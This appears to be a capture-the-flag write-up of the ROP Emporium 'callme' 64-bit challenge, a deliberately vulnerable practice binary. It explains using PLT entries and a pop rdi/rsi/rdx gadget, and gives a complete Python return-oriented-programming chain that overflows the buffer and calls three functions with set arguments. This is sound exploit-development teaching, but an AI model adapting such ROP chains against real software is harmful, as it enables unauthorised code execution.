# callme-64 bit

and so we begin the third challange of ROP Emporium.   
we are presented with an important message.  
![start](https://user-images.githubusercontent.com/60041914/78276174-58a50d00-751b-11ea-8c5d-b72c9eeff5f9.png)

and so we read them.(https://ropemporium.com/challenge/callme.html)  
"You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g."    
    
ok. calling the functions will not suffice this time.  
the return address will be pushed on to the stack and our ROP chain will be ruined.  
    
what we can do instead is jump to the PLT.
(if you are not already farmiliar with the PLT you should read Appendix A in https://ropemporium.com/guide.html)  
![calls](https://user-images.githubusercontent.com/60041914/78276181-59d63a00-751b-11ea-8a8b-93292e80e4ee.png)
  
 we need to find gadgets that allow us to control rdi,rsi and rdx to change the parameters.   
    
 running ROPgadget we get:   
 ```nasm
 0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
 ```
 we can write a ROP chain based on that.   
 ```python
 SET_PARAMS=0x00401ab0

CALLME_ONE=0x00401850
CALLME_TWO=0x00401870
CALLME_THREE=0x00401810

exploit=b'A'*40
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1) # rdi
exploit+=p64(0x2) # rsi
exploit+=p64(0x3) # rdx
exploit+=p64(CALLME_ONE)
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1) # rdi
exploit+=p64(0x2) # rsi
exploit+=p64(0x3) # rdx
exploit+=p64(CALLME_TWO)
exploit+=p64(SET_PARAMS)
exploit+=p64(0x1) # rdi
exploit+=p64(0x2) # rsi
exploit+=p64(0x3) # rdx
exploit+=p64(CALLME_THREE)
 ```
   
   
![pwned](https://user-images.githubusercontent.com/60041914/78276186-5b076700-751b-11ea-9daf-527c00681303.png)
